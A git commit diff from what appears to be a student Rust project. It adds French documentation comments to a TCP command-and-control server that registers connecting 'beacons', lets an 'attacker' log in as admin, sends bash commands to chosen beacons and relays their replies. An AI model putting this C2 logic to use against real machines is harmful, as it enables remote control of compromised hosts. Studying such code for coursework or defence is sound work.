4b9b22d306e6fd34a354df58acf8de6a5f4666f9
Hiruurouge <hiruurouge@gmail.com>
2022-12-08 16:04:58 +0100

    feat_documentation

--- src/server/src/main.rs
+++ src/server/src/main.rs
@@ -6,13 +6,26 @@ use std::fs::OpenOptions;
 use std::str;
 use std::io::BufReader;
 //static mut ADMIN:Vec<String>=Vec::new();
+
+///
 static  mut ONLINE:Vec<((String,String),TcpStream)>=Vec::new();
+/// Vérifie si un buffer est vide ou non 
+/// Parameters:
+///     buf: &[u8] le buffer 
 fn is_zero(buf: &[u8]) -> bool {
     buf.into_iter().all(|&b| b == 0)
 }
-
+/// Gère les ordres que l'attaquant envoies aux Beacons   
+/// Parameters:  
+///     commands:Vec<&str> la commande entrer par l'attaquant  
+///     mut stream:TcpStream la socket qui lie le serveur au beacon cible  
+/// Si la commande commence par admin on log l'attaquant (par défaut toute les sockets sont identifier comme des beacon)  
+/// Si la "commande" commence par response, on l'identifie comme la réponse envoyé par un beacon on l'envoie a tout les administrateur  
+/// Si la commande commence par "command" on l'identifie comme l'attaquant qui tente d'envoyer une commande bash à un beacon cible  
+/// Si la commande est exit, on déconnecte l'attaquant  
+/// Si la commande est "list" on affiche la liste des individus connecté  
 unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
-   //let mut ONLINE =HASHMAP.lock().expect("unable to lock mutex");
+    
     if commands[0]=="admin"{
         println!("ici");
         let mut i=0;
@@ -51,7 +64,9 @@ unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
 
             }
         }
-    } else if commands[0]=="exit"{
+
+    }
+    else if commands[0]=="exit"{
         let test:String=stream.peer_addr().unwrap().to_string();
         let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
         for i in 0..ONLINE.len(){
@@ -60,15 +75,21 @@ unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
                 stream.shutdown(Shutdown::Both).expect("shutdown call failed");
             }
         }
-    } else if commands[0]=="list"
+
+    }
+    else if commands[0]=="list"
     {
         for key in ONLINE.iter(){
             stream.write(key.0.0.as_bytes()).unwrap();
+            stream.write(b": ").unwrap();
             stream.write(key.0.1.as_bytes()).unwrap();
             stream.write(b"\n").unwrap();
         }
     }
 }
+/// Permet de retirer les caractères /n et /r en fin d'un string
+/// Parameters
+///     s: &mut String le string duquel on souhaite retirer ces caractères
 fn trim_newline(s: &mut String) {
     s.pop();
     if s.ends_with('\n') {
@@ -78,8 +99,11 @@ fn trim_newline(s: &mut String) {
         }
     }
 }
+/// Transforme un buffer en String en retirant les caractères spéciaux qu'il contient
+/// Parameter: 
+///     buffer: &mut [u8] le buffer dont on veut parse les données
 fn to_clean_string(buffer: &mut [u8]) -> String {
-    let mut vec_input = vec![];
+    let mut vec_input = vec![]; 
     vec_input.extend_from_slice(&buffer);
     let mut input = String::from_utf8(vec_input).unwrap();
     input.retain(|c| c != '\0');
@@ -89,29 +113,28 @@ fn to_clean_string(buffer: &mut [u8]) -> String {
     return  tmp.to_string();
 }
 
-fn register(stream: &str){
+/// Enregiste une adresse ip dans le fichier liste utilisateur
+/// Parameter:
+///     ip: &str l'adresse
+fn register(ip: &str){
     println!("registering");
     let mut file = OpenOptions::new()
         .write(true)
         .append(true)
         .open("src/user.txt")
         .unwrap();
-    writeln!(file,"{}",stream).expect("Unable to write file");
+    writeln!(file,"{}",ip).expect("Unable to write file");
 }
-
+/// Cette fonction prend une socket tcp en entrée, lis son buffer, et fait appel à la fonction order_manage
   fn handle_client(mut stream: TcpStream) {
-    //let mut data = [0u8; 1024]; // using 50 byte buffer*
       let test:String=stream.peer_addr().unwrap().to_string();
       let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
       let mut data =[0u8;1024];
-      //for _ in 0..128 { data.push(0); }
-      //let mut data = Vec::with_capacity(50);
       while match stream.read(&mut data) {
         Ok(size) => unsafe {
             if !is_zero(&data){
                 let tmp=to_clean_string(&mut data);
                 let orders:Vec<&str>=tmp.split(":").collect();
-                //println!("{:?}",orders);
                 orders_manage(orders,stream.try_clone().unwrap());
             } else {
                 for i in 0..ONLINE.len() {
@@ -134,7 +157,11 @@ fn register(stream: &str){
     }{}
 
  }
-
+/// Closure principale du programme  
+/// Bind le listener sur le port 3333  
+/// A chaque nouvelle connexion, on regarde si l'ip est enregistré dans le user.txt  
+/// Si oui, on ouvre un thread et on appelle la fonction handle_client  
+/// Si non, on ecrit l'ip dans le user.txt, et on appelle handle_client
 fn main() {
     let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
     // accept connections and process them, spawning a new thread for each one
@@ -159,7 +186,6 @@ fn main() {
                     }
                 }
                 if ok==false{register(client_ip.clone())};
-                //let mut ONLINE =HASHMAP.lock().expect(" Unable to find stream");
 
                 ONLINE.push(((client_ip.to_string(),"beacon".to_string()),stream.try_clone().expect(" Unable to clone stream")));
                 thread::spawn(move|| {
--- src/server/target/debug/deps/rust_projet-33ca975083ccab13.d
+++ src/server/target/debug/deps/rust_projet-33ca975083ccab13.d
@@ -1,5 +1,5 @@
-/home/cytech/ING/rust_projet/src/server/target/debug/deps/rust_projet-33ca975083ccab13: src/main.rs
+/home/cytech/ING/Rust_Project/src/server/target/debug/deps/rust_projet-33ca975083ccab13: src/main.rs
 
-/home/cytech/ING/rust_projet/src/server/target/debug/deps/rust_projet-33ca975083ccab13.d: src/main.rs
+/home/cytech/ING/Rust_Project/src/server/target/debug/deps/rust_projet-33ca975083ccab13.d: src/main.rs
 
 src/main.rs:
